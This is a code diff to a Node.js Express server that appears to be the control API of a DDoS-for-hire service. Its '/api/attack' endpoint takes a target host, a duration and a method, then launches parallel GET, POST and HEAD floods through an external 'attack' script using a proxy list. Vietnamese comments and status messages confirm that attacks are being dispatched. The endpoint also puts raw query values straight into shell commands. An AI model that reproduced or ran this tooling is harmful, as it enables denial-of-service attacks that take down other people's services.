@@ -38,9 +38,9 @@ const executeAttack = (command) => {
   });
 };
 
-const executeAllAttacks = (methods, host, time, threads, rate) => {
+const executeAllAttacks = (methods, host, time) => {
   const commands = methods.map((method) => {
-    return `node attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true`;
+    return `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`;
   });
 
   // Thực thi tất cả các lệnh tấn công song song mà không chờ kết quả
@@ -48,7 +48,7 @@ const executeAllAttacks = (methods, host, time, threads, rate) => {
 };
 
 app.get("/api/attack", (req, res) => {
-  const { key, host, time, method, port, modul, threads, rate } = req.query;
+  const { key, host, time, method, port, modul } = req.query;
 
   if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
     return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });
@@ -63,7 +63,7 @@ app.get("/api/attack", (req, res) => {
 
   if (modul === "FULL") {
     const methods = ["GET", "POST", "HEAD"];
-    executeAllAttacks(methods, host, time, threads, rate);  // Chạy đồng thời các lệnh tấn công mà không chờ kết quả
+    executeAllAttacks(methods, host, time);  // Chạy đồng thời các lệnh tấn công mà không chờ kết quả
     res.status(200).json({ 
       status: "SUCCESS", 
       message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", 
@@ -75,7 +75,7 @@ app.get("/api/attack", (req, res) => {
       pid: currentPID 
     });
   } else {
-    const command = `node attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true`;
+    const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
     executeAttack(command);  // Chạy tấn công cho modul không phải FULL
     res.status(200).json({ 
       status: "SUCCESS", 
